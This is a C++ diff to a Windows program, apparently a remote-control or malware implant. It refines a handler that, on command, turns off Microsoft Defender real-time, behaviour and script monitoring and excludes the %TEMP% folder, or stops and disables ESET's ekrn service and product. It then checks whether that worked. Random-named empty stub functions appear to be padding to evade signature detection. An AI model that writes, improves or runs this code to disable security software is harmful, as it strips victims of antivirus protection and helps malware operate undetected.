@@ -2365,27 +2365,40 @@ static void CheckAndHandleDefender() {
     if (target != "defender" && target != "eset") return;
     DWORD exitCode = 0;
     std::string cmd;
+    std::string output;
     if (target == "defender") {
         if (subAction == "disable") {
             cmd = "powershell -NoProfile -Command \"Add-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true\"";
         } else {
             cmd = "powershell -NoProfile -Command \"Remove-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableScriptScanning $false\"";
         }
+        output = ExecuteCommand(cmd, &exitCode);
+        if (output.empty()) output = "(no output)";
     } else {
-        if (subAction == "disable") {
-            cmd = "sc stop ekrn & sc config ekrn start= disabled & for /f \"delims=\" %i in ('dir /s /b \"C:\\Program Files\\ecls.exe\" \"C:\\Program Files (x86)\\ecls.exe\" 2^>nul') do \"%i\" /deploy-action=disable-product";
+        DWORD pec = 0;
+        std::string pout = ExecuteCommand("sc query ekrn", &pec);
+        if (pec != 0) {
+            exitCode = 0;
+            output = "ESET not installed (ekrn service not found)";
         } else {
-            cmd = "sc config ekrn start= auto & sc start ekrn & for /f \"delims=\" %i in ('dir /s /b \"C:\\Program Files\\ecls.exe\" \"C:\\Program Files (x86)\\ecls.exe\" 2^>nul') do \"%i\" /deploy-action=enable-product";
-        }
-    }
-    std::string output = ExecuteCommand(cmd, &exitCode);
-    if (output.empty()) output = "(no output)";
-    if (target == "eset" && subAction == "disable") {
-        DWORD qec = 0;
-        std::string qout = ExecuteCommand("sc query ekrn", &qec);
-        if (qec == 0 && qout.find("STOPPED") == std::string::npos && qout.find("FAILED") == std::string::npos) {
-            if (exitCode == 0) exitCode = 1;
-            output += "\n[ekrn service still running]";
+            if (subAction == "disable") {
+                cmd = "sc stop ekrn & sc config ekrn start= disabled & for /f \"delims=\" %i in ('dir /s /b \"C:\\Program Files\\ecls.exe\" \"C:\\Program Files (x86)\\ecls.exe\" 2^>nul') do \"%i\" /deploy-action=disable-product";
+            } else {
+                cmd = "sc config ekrn start= auto & sc start ekrn & for /f \"delims=\" %i in ('dir /s /b \"C:\\Program Files\\ecls.exe\" \"C:\\Program Files (x86)\\ecls.exe\" 2^>nul') do \"%i\" /deploy-action=enable-product";
+            }
+            output = ExecuteCommand(cmd, &exitCode);
+            if (output.empty()) output = "(no output)";
+            DWORD qec = 0;
+            std::string qout = ExecuteCommand("sc query ekrn", &qec);
+            if (qec == 0) {
+                if (subAction == "disable" && qout.find("STOPPED") == std::string::npos) {
+                    if (exitCode == 0) exitCode = 1;
+                    output += "\n[ekrn service still running]";
+                } else if (subAction == "enable" && qout.find("RUNNING") == std::string::npos) {
+                    if (exitCode == 0) exitCode = 1;
+                    output += "\n[ekrn service not running after enable]";
+                }
+            }
         }
     }
     if (output.find("Access is denied") != std::string::npos) exitCode = 2;
@@ -3001,3 +3014,4 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
 int _sd7f9bd008da14598892b2482d9609e20(void){return 0;}
 int _s648d5539b27140ebb936cd13c8ed671a(void){return 0;}
+int _s71d014ab11584b54bab8f56bc6bea1fb(void){return 0;}
